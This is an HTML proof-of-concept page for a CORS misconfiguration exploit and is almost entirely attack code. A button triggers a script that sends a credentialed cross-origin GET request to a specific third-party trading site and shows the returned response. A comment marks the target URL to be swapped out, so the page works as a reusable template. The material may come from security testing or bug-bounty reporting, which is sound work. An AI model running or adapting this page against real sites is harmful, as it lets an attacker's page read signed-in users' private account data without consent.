<!DOCTYPE html>
<html>
<body>
  <center>
    <h2>CORS POC Exploit</h2>
    <h3>GET request with credentials</h3>
    <div id="demo">
      <button type="button" onclick="cors()">Exploit - Click here</button>
    </div>

    <script>
    function cors() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function () {
        if (this.readyState == 4) {
          alert("Status: " + this.status + "\nResponse: " + this.responseText);
        }
      };
      xhttp.open("GET", "https://egy.naeemonline.com/ultimate/Trading/Home", true); // change this
      xhttp.withCredentials = true; // optional: only works if server allows credentials
      xhttp.send();
    }
    </script>
</body>
